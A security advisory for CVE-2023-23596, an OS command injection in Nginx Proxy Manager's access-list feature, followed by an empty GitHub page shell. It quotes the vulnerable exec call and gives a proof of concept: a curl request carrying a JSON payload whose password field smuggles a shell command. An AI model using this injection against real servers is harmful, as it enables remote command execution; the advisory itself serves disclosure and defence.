=== Content from advisory.dw1.io_88572f79_20250115_090016.html ===
    [dw1's Advisory](/)   [Home](/)  [List](/list) [About](https://dw1.io)

---

# CVE-2023-23596: OS Command Injection in Nginx Proxy Manager

 Jan 20 2023 -  3 mins

---

## Description

Nginx Proxy Manager prior to version <= 2.9.19 is vulnerable to OS command injection. When creating an access list, the back-end will build an `htpasswd` file with crafted username and/or password input and concatenated without any validation and is directly passed to the `exec` command, potentially allowing an authenticated attacker to execute arbitrary commands on the system.

## Details

### Building Access file

File [`/backend/internal/access-list.js:507-513`](https://github.com/NginxProxyManager/nginx-proxy-manager/blob/4f10d129c20cc82494b95cc94b97f859dbd4b54d/backend/internal/access-list.js#L507-L513):

```
  // ...
  if (typeof item.password !== 'undefined' && item.password.length) {
    logger.info('Adding: ' + item.username);

    utils.exec('/usr/bin/htpasswd -b "' + htpasswd_file + '" "' + item.username + '" "' + item.password + '"')
      .then((/*result*/) => {
        next();
      })
  // ...

```

The vulnerability in the code snippet above is located in the **build** method, where the `utils.exec()` function is used to execute the `/usr/bin/htpasswd` command. The function takes **item.username** and **item.password** as input, which is concatenated to create an htpasswd file & passed as an argument to the `utils.exec()` function. This allows an attacker to inject arbitrary commands into the input, potentially allowing them to execute arbitrary commands on the system.

### Proof of Concept

This proof of concept demonstrates how an attacker can exploit this vulnerability. It uses a `curl` command to send a POST request to the `/api/nginx/access-lists` endpoint for creating an access list.

```
$ curl -sX POST http://TARGET.HOST/api/nginx/access-lists \
> -H "Authorization: Bearer ${JWT}" \
> --data-binary "@payload.json"

```

The request includes a JSON Web Token (JWT) in the “Authorization” header to authenticate the request, and the payload of the request is taken from a `payload.json` file, which contains the JSON data for creating an access list, including the name of the list, the type of access control, and an array of items.

```
{
  "name": "lorem-ipsum",
  "satisfy_any": false,
  "pass_auth": false,
  "items": [
    {
      "username": "foo",
      "password": "bar\";touch \"pwned"
    }
  ],
  "clients": []
}

```

In this example, the payload includes a single item with a username of “**foo**” and a password of “**bar”;touch “pwned**”. When the request is sent, the server-side code will process the payload, and will insert the payload’s `username` and `password` into the `htpasswd` command without any validation. This payload contains a malicious command, **touch “pwned”**, which will create an empty `pwned` file, and will be executed by the server.

## Impact

By injecting arbitrary commands into the `htpasswd` command, an attacker can execute arbitrary commands on the server.

## Timeline

* 20 May 2022: Vulnerability reported thru huntr.dev platform.
* 21 May 2022: The huntr team filed [open issue](https://github.com/nginxproxymanager/nginx-proxy-manager/issues/2063) to request security contact.
* 17 Sep 2022: Report staled.
* 14 Jan 2023: Request a CVE ID to MITRE CNA.
* 15 Jan 2023: CVE-2023-23596 was assigned.
* 20 Jan 2023: Advisory published.

## References

* [/backend/internal/access-list.js:510](https://github.com/NginxProxyManager/nginx-proxy-manager/blob/4f10d129c20cc82494b95cc94b97f859dbd4b54d/backend/internal/access-list.js#L510)

* [cwe-78](/category/cwe-78/)
* [cve-2023](/tag/cve-2023/)

---

   © 2024 dw1's Advisory | Made with [Jekyll-Archie](https://github.com/slashformotion/jekyll-archie) and [Jekyll](https://jekyllrb.com) | Subscribe via [Atom](/atom.xml)


=== Content from github.com_40163c16_20250115_090016.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNginxProxyManager%2Fnginx-proxy-manager%2Fblob%2F4f10d129c20cc82494b95cc94b97f859dbd4b54d%2Fbackend%2Finternal%2Faccess-list.js)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FNginxProxyManager%2Fnginx-proxy-manager%2Fblob%2F4f10d129c20cc82494b95cc94b97f859dbd4b54d%2Fbackend%2Finternal%2Faccess-list.js)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=NginxProxyManager%2Fnginx-proxy-manager)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[NginxProxyManager](/NginxProxyManager)
/
**[nginx-proxy-manager](/NginxProxyManager/nginx-proxy-manager)**
Public

* [Notifications](/login?return_to=%2FNginxProxyManager%2Fnginx-proxy-manager) You must be signed in to change notification settings
* [Fork
  2.8k](/login?return_to=%2FNginxProxyManager%2Fnginx-proxy-manager)
* [Star
   24.1k](/login?return_to=%2FNginxProxyManager%2Fnginx-proxy-manager)

* [Code](/NginxProxyManager/nginx-proxy-manager)
* [Issues
  1.5k](/NginxProxyManager/nginx-proxy-manager/issues)
* [Pull requests
  69](/NginxProxyManager/nginx-proxy-manager/pulls)
* [Discussions](/NginxProxyManager/nginx-proxy-manager/discussions)
* [Actions](/NginxProxyManager/nginx-proxy-manager/actions)
* [Security](/NginxProxyManager/nginx-proxy-manager/security)
* [Insights](/NginxProxyManager/nginx-proxy-manager/pulse)

Additional navigation options

* [Code](/NginxProxyManager/nginx-proxy-manager)
* [Issues](/NginxProxyManager/nginx-proxy-manager/issues)
* [Pull requests](/NginxProxyManager/nginx-proxy-manager/pulls)
* [Discussions](/NginxProxyManager/nginx-proxy-manager/discussions)
* [Actions](/NginxProxyManager/nginx-proxy-manager/actions)
* [Security](/NginxProxyManager/nginx-proxy-manager/security)
* [Insights](/NginxProxyManager/nginx-proxy-manager/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


